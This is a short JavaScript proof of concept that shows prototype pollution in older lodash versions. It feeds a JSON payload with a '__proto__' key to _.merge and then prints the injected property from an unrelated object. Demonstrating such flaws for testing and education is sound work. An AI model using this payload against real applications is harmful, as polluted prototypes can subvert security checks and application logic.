
const _ = require('lodash');

// Example of vulnerable lodash function (merge is vulnerable to prototype pollution in older versions)
let obj = {};
_.merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log("Polluted property: ", obj.polluted);  // Should output: "yes" due to prototype pollution
